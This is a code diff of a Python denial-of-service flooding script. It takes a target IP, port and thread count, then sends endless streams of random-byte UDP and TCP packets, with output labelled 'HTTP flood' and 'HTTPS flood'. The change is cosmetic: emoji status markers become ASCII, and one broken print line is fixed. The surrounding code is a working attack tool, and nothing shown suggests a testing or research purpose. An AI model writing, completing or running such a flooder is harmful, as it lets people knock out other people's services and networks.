@@ -67,20 +67,20 @@ times = int(input("\033[34m Time : \033[0m"))
 threads = int(input("\033[33m Threads : \033[0m"))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[💥]","[⚠️]","[#]"))
+	i = random.choice(("[+]","[!]","[*]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i 💥" \033[97mBASE2  \033[35mHTTP flood  \033[95m" +str(ip)+ " \033[0m")
+			print(i +" \033[97mBASE2  \033[35mHTTP flood  \033[95m" +str(ip)+ " \033[0m")
 		except:
-			print("[⚠️] Error!!!")
+			print("[!] Error!!!")
 
 def run2():
 	data = random._urandom(999)
-	i = random.choice(("[💥]","[⚠️]","[#]"))
+	i = random.choice(("[+]","[!]","[*]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -91,12 +91,12 @@ def run2():
 			print(i +" \033[33mBASE2  \033[94mHTTPS flood"  +str(ip)+ " \033[0m")
 		except:
 			s.close()
-			print("[⚠️] Error!!!")
+			print("[!] Error!!!")
             
 
 def run3():
 	data = random._urandom(818)
-	i = random.choice(("[💥]","[!]","[#]"))
+	i = random.choice(("[+]","[!]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
